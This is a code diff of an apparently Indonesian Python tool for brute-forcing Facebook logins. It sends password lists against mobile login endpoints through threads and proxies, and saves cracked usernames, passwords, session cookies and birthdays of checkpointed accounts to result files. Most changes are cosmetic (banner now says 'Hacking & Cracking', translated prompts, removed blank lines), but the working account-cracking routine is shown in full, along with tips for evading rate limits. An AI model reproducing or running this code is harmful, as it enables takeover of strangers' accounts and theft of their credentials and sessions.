@@ -309,13 +309,12 @@ def logo():
 \33[37m  ╚═══██╗    ██║    ██╔══██╗  ╚████╔╝
 \33[37m ██████╔╝    ██║    ██║  ██║   ╚██╔╝
 \33[37m ╚═════╝     ╚═╝    ╚═╝  ╚═╝    ╚═╝
-\x1b[0;31m█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
-\x1b[0;31m█  \33[m𝑮𝒊𝒕𝒉𝒖𝒃 : \33[1;32mPrivate  
-\x1b[0;31m█  \33[m𝑭𝒂𝒄𝒆𝒃𝒐𝒐𝒌 : \33[1;33mTeddy Cahyo Putra Pangembara           
-\x1b[0;31m█  \33[m𝑾𝒉𝒂𝒕𝒔𝑨𝒑𝒑 : \33[1;33m082290238779
-\x1b[0;31m█  \33[m𝑰𝒏𝒔𝒕𝒂𝒈𝒓𝒂𝒎 : \33[1;33mTeddyyyy_11     
-\x1b[0;31m█  \33[m𝑻𝒐𝒐𝒍𝒔 𝑺𝒄𝒓𝒊𝒑𝒕 : \33[1;96mFREE V.1   
-\x1b[0;31m█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█""")
+\x1b[0;33[mGITHUB    : \33[1;32mPrivate  
+\x1b[0;33[mFACEBOOK  : \33[1;33mTeddy Cahyo Putra Pangembara           
+\x1b[0;33[mWHATSAPP  : \33[1;33m082290238779
+\x1b[0;33[mINSTAGRAM : \33[1;33mTeddyyyy_11     
+\x1b[0;33[mSCRIP FOR : \33[1;96mHacking & Cracking 
+\x1b[0;33[mVERSION   : \33[1;96mV.01 Beta.Test  """)
 
 
 #CRACK SELESAI
@@ -327,11 +326,11 @@ def hasil(ok,cp):
 
 
     if len(ok) != 0 or len(cp) != 0:
-        print(f'\n%s▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n [%s✓%s] %sCRACK TELAH SELESAI...\n%s▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄'%(N,H,N,H,N))
+        print(f'\n%s▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n [%s✓%s] %sCRACK TELAH SELESAI...\n%s▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄'%(N,H,N,H,N))
         print(f' %s[%s+%s] Number of Accounts OK : %s%s%s'%(N,H,N,H,str(len(ok)),N))
         print(f' [%s+%s] Number of Accounts CP : %s%s%s'%(K,N,K,str(len(cp)),N))
 
-        cek_cp = input(f"{N}▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n [{K}?{N}] Show CP detector options [{H}Y{N}/{M}t{N}]: ")
+        cek_cp = input(f"{N}▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n [{K}?{N}] Ingin Melihat Opsi Checkpoint ? [{H}Y{N}/{M}t{N}]: ")
 
         if cek_cp =="":
             print(f"\n [{M}!{N}] Don't be empty");hasil(ok,cp)
@@ -350,9 +349,9 @@ def hasil(ok,cp):
                 kontol = memek.replace('\n', '')
                 titid  = kontol.split(' • ')
                 print(f'{N}▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n {H}LOGIN PROCESS')
-                jalan(f' {N}[{M}?{N}] Account : {K}{kontol.replace("[ROY-CP] ", "")}{N}')
+                jalan(f' {N}[{M}?{N}] Account : {K}{kontol.replace("[HASIL CHECKPOINT] ", "")}{N}')
                 try:
-                    log_hasil(titid[0].replace("[ROY-CP] ", ""), titid[1])
+                    log_hasil(titid[0].replace("[HASIL CHECKPOINT] ", ""), titid[1])
                 except requests.exceptions.ConnectionError:
                     continue
                     print("")
@@ -811,7 +810,7 @@ def moch_yayan(my_name,my_id):
 
 
 
-        jalan('\n %s[%s✓%s] %sSuccessfully delete Token/Cookie...'%(N,H,N,H))
+        jalan('\n %s[%s✓%s] %sSuccessfully delete Cookie...'%(N,H,N,H))
 
 
 
@@ -1787,7 +1786,7 @@ class __crack__:
     def plerr(self,id):
         self.id = id
         print(f'\n %s[%s•%s] Total ID : %s%s%s' %(N,H,N,H,len(self.id),N))
-        ___yayanganteng___ = input('%s\n [%s?%s] Masukan Password Tools (%sInput%s) : %s'%(N,K,N,H,N,H))
+        ___yayanganteng___ = input('%s\n [%s?%s] Silakan Tekan (%sENTER%s) : %s'%(N,K,N,H,N,H))
         if ___yayanganteng___ in ('Teddy Ganteng', 'Strovmirviaska'):
             self.tampilkan_apk()
             print('%s▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n %sSETTING MANUAL PASSWORD%s'%(N,BM,N))
@@ -1816,9 +1815,9 @@ class __crack__:
                                     except: pass
                             hasil(ok,cp)
                         elif cin == '2':
-                            print('%s▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n [%s+%s] OK : results/OK-%s-%s-%s.txt'%(N,H,N,ha, op, ta))
+                            print('%s▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n [%s+%s] OK : results/OK-%s-%s-%s.txt'%(N,H,N,ha, op, ta))
                             print(' %s[%s+%s] CP : results/CP-%s-%s-%s.txt'%(N,K,N,ha, op, ta))
-                            print('%s▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n [%s!%s]Aktifkan Mode Pesawat 5 detik jika Terkena Spam \n [%s!%s] Aktifkan Mode Pesawat Pada DUMP ID Ke 1000\n [%s!%s] CTRL+Z %sPada Keyboard%s Jika Ingin Stop !\n▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄'%(N,M,N,M,N,M,N,H,N))
+                            print('%s▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n [%s!%s]Aktifkan Mode Pesawat 5 detik jika Terkena Spam \n [%s!%s] Aktifkan Mode Pesawat Pada DUMP ID Ke 1000\n [%s!%s] CTRL+Z %sPada Keyboard%s Jika Ingin Stop !\n▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄'%(N,M,N,M,N,M,N,H,N))
                             with YayanGanteng(max_workers=30) as (__yayanXD__):
                                 for ikeh in self.id:
                                     try:
@@ -1871,259 +1870,71 @@ class __crack__:
                 ua2 = random.choice(ugen2)
                 session.headers.update({'Host': cebok,'cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                 p = session.get('https://'+cebok+'/login/device-based/password/?uid='+user+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
-
-
-
                 dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":user,"next":"https://"+cebok+"/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
-
-
-
                 koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
-
-
-
                 koki+=' m_pixel_ratio=2.625; wd=412x756'
-
-
-
                 heade={'Host': cebok,'cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://'+cebok,'content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://'+cebok+'/login/device-based/password/?uid='+user+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
-
-
-
                 po = session.post('https://'+cebok+'/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
-
-
-
                 if "c_user" in session.cookies.get_dict():
-
-
-
                     cooz = session.cookies.get_dict()
-
-
-
                     coki = 'datr=' + cooz['datr'] + ';' + ('c_user=' + cooz['c_user']) + ';' + ('fr=' + cooz['fr']) + ';' + ('xs=' + cooz['xs'])
-
-
-
                     if "t" in Apk:
-
-
-
                         print('\r %sMETA LIVE OK %s               \n Username : %s\n Password : %s%s'%(H,waktu,user,pw,N))
-
-
-
                         print(f'\r {H}Cookie   : {coki}\n')
-
-
-
                     elif "y" in Apk:
-
-
-
                         print(f'\r %sMETA LIVE OK %s           	    \n Username : %s\n Password : %s%s'%(H,waktu,user,pw,N))
-
-
-
                         print(f'\r {H}Cookie   : {coki}')
-
-
-
                     wrt = '[ROY-OK] %s • %s' % (user,pw)
-
-
-
                     ok.append(wrt)
-
-
-
                     open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
-
-
-
                     break
-
-
-
                 elif 'checkpoint' in session.cookies.get_dict():
-
-
-
                     try:
-
-
-
                         tokenz = open('.token.txt').read()
-
-
-
                         cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
-
-
-
                         month, day, year = cp_ttl.split('/')
-
-
-
                         month = bulan_ttl[month]
-
-
-
                         print('\r %sMETA LIVE CP %s               \n Username : %s\n Password : %s\n Tanggal Lahir : %s %s %s%s\n'%(K,waktu,user,pw,day,month,year,N))
-
-
-
                         wrt = '[ROY-CP] %s • %s • %s %s %s' % (user,pw,day,month,year)
-
-
-
                         cp.append(wrt)
-
-
-
                         open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
-
-
-
                         break
-
-
-
                     except (KeyError, IOError):
-
-
-
                         month = ''
-
-
-
                         day   = ''
-
-
-
                         year  = ''
-
-
-
                     except:pass
-
-
-
                     print('\r %sMETA LIVE CP %s               \n Username : %s\n Password : %s%s\n'%(K,waktu,user,pw,N))
-
-
-
                     wrt = '[ROY-CP] %s • %s' % (user,pw)
-
-
-
                     cp.append(wrt)
-
-
-
                     open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
-
-
-
                     break
-
-
-
                 else:
-
-
-
                     continue
-
-
-
                 #time.sleep(31)
-
-
-
             loop+=1
-
-
-
         except requests.exceptions.ConnectionError:
-
-
-
             self.__metode__(cebok, user, pasw)
-
-
-
-
-
-
-
 
 
 
 
     def __pler__(self):
 
-
-
         yan = input('\n %s[%s?%s] Choose Method : '%(N,K,N))
-
-
-
         if yan == '':
-
-
-
             print('\n %s[%s×%s] Sorry, it is wrong...!'%(N,M,N));self.__pler__()
-
-
-
         elif yan in ('1', '01'):
-
-
-
             xx = "free.facebook.com"
-
-
-
             self.kombinasi_pw(xx)
-
-
-
         elif yan in ('2', '02'):
-
-
-
             xx = "mbasic.facebook.com"
-
-
-
             self.kombinasi_pw(xx)
-
-
-
         elif yan in ('3', '03'):
-
-
-
             xx = "m.facebook.com"
-
-
-
             self.kombinasi_pw(xx)
-
-
-
         else:
-
-
-
             print('\n %s[%s×%s] Sorry, it is wrong...!'%(N,M,N));self.__pler__()
-
-
-
-
-
 
 
     def kombinasi_pw(self,url):
@@ -2169,8 +1980,8 @@ class __crack__:
             hasil(ok,cp)
 
         elif pw in["3","03"]:
-            print('%s▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n %sADDITIONAL PASSWORD MENU%s'%(N,BM,N))
-            print(" %s[%s!%s] Use %sKOMMA%s for separator"%(N,M,N,H,N))
+            print('%s▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n %sSETTING PASSWORD MANUAL%s'%(N,BM,N))
+            print(" %s[%s!%s] Berikan Tanda %sKomma Pada%s Setiap Kata"%(N,M,N,H,N))
             print(" %s[%s!%s] Example : %ssayang,rahasia,bismillah%s"%(N,M,N,H,N))
             pw = input(f" {N}[{K}?{N}] Enter additional password : {H}").split(",")
             print('%s▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n [%s+%s] OK : results/OK-%s-%s-%s.txt'%(N,H,N,ha, op, ta))
